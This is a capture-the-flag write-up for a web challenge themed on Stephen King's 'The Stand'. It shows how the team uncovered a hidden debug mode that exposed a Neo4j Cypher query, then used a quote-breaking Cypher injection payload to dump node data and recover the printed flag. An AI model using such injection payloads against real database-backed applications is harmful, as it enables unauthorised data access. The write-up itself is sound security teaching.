# the_stand \[500 points\] (1 solve)

> Some people are good people and have friends. Randall Flagg is evil, with no friends, but he has the knowledge.

This challenge consists of solely a web interface, which we can deduce is powered by Express and nginx (presumably for load balancing) from response headers. Also, as you might be able to tell from the title, the entire challenge uses names and quotes from Steven King's 1978 dark fantasy novel "The Stand."

This problem was mainly solved by Aayush, but was also worked on by Nate, Alex, Ryan, Lauren, and Eamon.

## The Attack Vector

The main functionality of this challenge is to request a list of people and query these people to see who their friends are. As you might be able to tell, the flag is somehow related to the character Randall Flagg, who doesn't have friends, but he has "the knowledge" (presumably the flag). If we can somehow query more information about Randall Flag, we might be able to gain more information which would allow us to find the flag.

To start, we can query the list of people at `/people` and get a list of people and their quotes.

<details>
<summary>People and their quotes</summary>

```
Data for Stu Redman:
{"message":"Stu Redman says: Here you go, I lost my appetite all of a sudden.","friends":["Frances Goldsmith says: Harold, I don't think I'm ever gonna get these calluses off my fanny.","Abagail Freemantle says: I have sinned in pride. So have you all. But that's past now."]}

Data for Abagail Freemantle:
{"message":"This person has no friends (sad!)"}

Data for Frances Goldsmith:
{"message":"Frances Goldsmith says: Harold, I don't think I'm ever gonna get these calluses off my fanny.","friends":["Harold Lauder says: If you go with me, I’ll treat you like a queen. No, better than a queen. Like a goddess.","Abagail Freemantle says: I have sinned in pride. So have you all. But that's past now."]}

Data for Randall Flagg:
{"message":"This person has no friends (sad!)"}

Data for Larry Underwood:
{"message":"Larry Underwood says: Baby, can you dig your man?","friends":["Harold Lauder says: If you go with me, I’ll treat you like a queen. No, better than a queen. Like a goddess.","Frances Goldsmith says: Harold, I don't think I'm ever gonna get these calluses off my fanny."]}

Data for Harold Lauder:
{"message":"This person has no friends (sad!)"}

Data for Glen Bateman:
{"message":"Glen Bateman says: The law is an imperfect mechanism. It doesn't operate at all when there is no enforcement.","friends":["Stu Redman says: Here you go, I lost my appetite all of a sudden."]}
```

</details>

<br>

However, this doesn't give us any information about the challenge. 

When you open the inspector, we can see a clue in the HTML that will help us understand the challenge better:

```html
    <!-- Form to query a character's friends -->
    <h2>Find Friends</h2>
    <form id="friend-form">
        <label for="first-name">First Name:</label>
        <input type="text" id="first-name" placeholder="First Name" required>
        <br>
        <label for="last-name">Last Name:</label>
        <input type="text" id="last-name" placeholder="Last Name" required>
        <br>
        <!--
        <label for="debug">Debug:</label>
        <input type="checkbox" id="debug" name="debug">
        -->
        <button type="submit">Get Friends</button>
    </form>
    <div id="results"></div>
```

Uncommenting the debug checkbox now appends `&debug=true` to our query, and returns a lot of information: 

```json
{
    "message": "This person has no friends (sad!)",
    "query": "MATCH (p:Person (firstName: 'Randall', lastName: 'Flagg')) OPTIONAL MATCH (p)-[:FRIEND]->(f) RETURN p.tag AS personTag, f.firstName AS firstName, f.lastName AS lastName, f.tag AS friendTag\n"
}
```

<details>
<summary>Formatted version</summary>

```
MATCH (p:Person {firstName: 'Randall', lastName: 'Flagg'})
OPTIONAL MATCH (p)-[:FRIEND]->(f)
RETURN p.tag AS personTag, f.firstName AS firstName, f.lastName AS lastName, f.tag AS friendTag
```

</details>

<br>

Essentially, we can now see that our input is being executed in a Cypher query, which is querying a Neo4j database that presumably contains the flag. Given that the `firstName` is directly inserted into the string (and not sanitized), we can infer that we need to create a Cypher injection to reveal information about Randall Flagg that we aren't currently able to see.

It is important to note that, at the moment, the server is matching for the *friends* of Randall Flagg and not Randall Flagg's data.

## Execution

From this information, we know that we need to return Randal Flagg's data and not his friend's, since he has no friends but he has "the knowledge." To build our injection, we can break out of the current input with an apostrophe and construct a query. We need to make sure to add a comment (`//`) after that to force the database to ignore the invalid end part of the query added by the server.

So, this is our attack payload:

```cypher
Randall' }) OPTIONAL MATCH (n) RETURN n.tag as personTag, n.firstName as firstName, n.lastName as lastName, n.tag as friendTag //
```


When it's all formatted correctly and concatenated on the server, the query looks something like this:

> ![NOTE]
> I've added a couple of newlines between the injected query and the comment just for viewing purposes.

```
MATCH (p:Person {firstName: 'Randall'})
OPTIONAL MATCH (n)
RETURN n.tag AS personTag, n.firstName AS firstName, n.lastName AS lastName, n.tag AS friendTag


// ', lastName: 'Flagg'}) OPTIONAL MATCH (p)-[:FRIEND]->(f) RETURN p.tag AS personTag, f.firstName AS firstName, f.lastName AS lastName, f.tag AS friendTag
```


Now, instead of returning the friends of Randall Flagg, the database returns the actual tag (message) of Randall. 

![solve screen](/knowledge/the_stand/solution/solve.png)

Flag:
```
ictf{People_who_try_hard_to_do_the_right_thing_always_seem_mad}
```

## Conclusion

This challenge honestly wasn't *that* hard, or, at least, it was significantly easier than Boing. However, I suspect that none of the other teams solved this because of the need to find the debug mode: the combination of the new category "knowledge" and the references to passages from the book "The Stand" leads you to believe that OSINT is required to solve the challenge.  